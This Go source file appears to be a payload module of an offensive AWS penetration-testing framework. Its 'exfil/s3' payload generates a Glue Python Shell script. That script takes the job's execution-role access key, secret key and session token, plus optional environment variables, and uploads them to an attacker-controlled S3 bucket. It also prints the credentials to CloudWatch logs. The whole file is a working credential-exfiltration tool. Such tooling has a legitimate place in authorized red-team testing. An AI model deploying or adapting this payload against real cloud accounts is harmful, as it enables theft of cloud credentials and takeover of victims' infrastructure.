package glue

import (
	"fmt"
	"github.com/DataDog/pathrunner/pkg/modules"
	"github.com/DataDog/pathrunner/pkg/payloads"
	"strings"
)

// ExfilS3Payload generates a Glue Python Shell script that extracts the
// Glue job's execution role credentials and writes them to an attacker-controlled
// S3 bucket. The victim account needs s3:PutObject on the attacker bucket (granted
// via a resource-based policy on the attacker side). Credentials are also printed
// to stdout using PATHFINDER_IDENTITY_DATA markers for CloudWatch-based auto-import.
type ExfilS3Payload struct{}

func init() {
	payloads.Register(&ExfilS3Payload{})
}

func (p *ExfilS3Payload) GetName() string {
	return "exfil/s3"
}

func (p *ExfilS3Payload) GetDescription() string {
	return "Exfiltrate execution role credentials to an attacker-controlled S3 bucket via Glue job"
}

func (p *ExfilS3Payload) GetTags() []string {
	return []string{
		payloads.TagServiceGlue,
		payloads.TagLanguagePython,
		payloads.TagTechniqueExfil,
		payloads.TagTransportFilesystem,
	}
}

func (p *ExfilS3Payload) GetOptions() []modules.Option {
	return []modules.Option{
		{
			Name:        "EXFIL_BUCKET",
			Description: "Attacker-controlled S3 bucket name for credential exfiltration",
			Required:    true,
		},
		{
			Name:        "EXFIL_PREFIX",
			Description: "S3 key prefix for the exfiltrated data (e.g., 'loot/')",
			Required:    false,
			Default:     "exfil/",
		},
		{
			Name:        "INCLUDE_ENV",
			Description: "Include Glue environment variables in the exfiltrated payload (true/false)",
			Required:    false,
			Default:     "false",
		},
	}
}

func (p *ExfilS3Payload) Validate(options map[string]string) error {
	bucket := options["EXFIL_BUCKET"]
	if bucket == "" {
		return fmt.Errorf("EXFIL_BUCKET is required for exfil/s3 payload")
	}
	if strings.HasPrefix(bucket, "s3://") {
		return fmt.Errorf("EXFIL_BUCKET should be the bucket name only, not an S3 URI")
	}
	return nil
}

func (p *ExfilS3Payload) GenerateCode(options map[string]string) (string, error) {
	exfilBucket := options["EXFIL_BUCKET"]
	exfilPrefix := options["EXFIL_PREFIX"]
	if exfilPrefix == "" {
		exfilPrefix = "exfil/"
	}
	includeEnv := options["INCLUDE_ENV"] == "true"

	envCode := ""
	if includeEnv {
		envCode = `
    # Include environment variables
    env_vars = {k: v for k, v in sorted(os.environ.items())
                if k.startswith(('AWS_', 'GLUE_', 'SPARK_'))}
    payload['environment'] = env_vars
`
	}

	code := fmt.Sprintf(`import boto3
import json
import os
import sys
import time

exfil_bucket = '%s'
exfil_prefix = '%s'

# Override from job arguments if provided
for i, arg in enumerate(sys.argv):
    if arg == '--EXFIL_BUCKET' and i + 1 < len(sys.argv):
        exfil_bucket = sys.argv[i + 1]
    if arg == '--EXFIL_PREFIX' and i + 1 < len(sys.argv):
        exfil_prefix = sys.argv[i + 1]

# Get caller identity and credentials
sts = boto3.client('sts')
identity = sts.get_caller_identity()
session = boto3.Session()
credentials = session.get_credentials()

print(f"Caller ARN: {identity['Arn']}")
print(f"Account: {identity['Account']}")
print(f"Region: {session.region_name}")

payload = {
    'type': 'glue_credential_exfil',
    'timestamp': int(time.time()),
    'caller_identity': {
        'account': identity['Account'],
        'arn': identity['Arn'],
        'user_id': identity['UserId']
    },
    'region': session.region_name
}

if credentials:
    creds = credentials.get_frozen_credentials()
    payload['credentials'] = {
        'access_key_id': creds.access_key,
        'secret_access_key': creds.secret_key,
        'session_token': creds.token
    }

    # Also print to CloudWatch for auto-import
    print(f"--- PATHFINDER_IDENTITY_DATA ---")
    print(f"NAME=glue-role/{identity['Arn'].split('/')[-1]}")
    print(f"TYPE=keys")
    print(f"ACCESS_KEY_ID={creds.access_key}")
    print(f"SECRET_ACCESS_KEY={creds.secret_key}")
    if creds.token:
        print(f"SESSION_TOKEN={creds.token}")
    print(f"REGION={session.region_name}")
    print(f"AUTO_SWITCH=false")
    print(f"--- END_PATHFINDER_IDENTITY_DATA ---")
%s
# Write credentials to attacker S3 bucket
# Uses the Glue execution role's permissions -- the attacker bucket must have
# a resource-based policy granting s3:PutObject to the victim account
s3 = boto3.client('s3')
exfil_key = f"{exfil_prefix}{identity['Account']}/{int(time.time())}.json"

try:
    s3.put_object(
        Bucket=exfil_bucket,
        Key=exfil_key,
        Body=json.dumps(payload, indent=2),
        ContentType='application/json'
    )
    print(f"Credentials written to s3://{exfil_bucket}/{exfil_key}")
except Exception as e:
    print(f"S3 exfiltration error: {e}")
    raise
`, exfilBucket, exfilPrefix, envCode)

	return code, nil
}

func (p *ExfilS3Payload) ProcessResult(result string) (string, error) {
	return result, nil
}
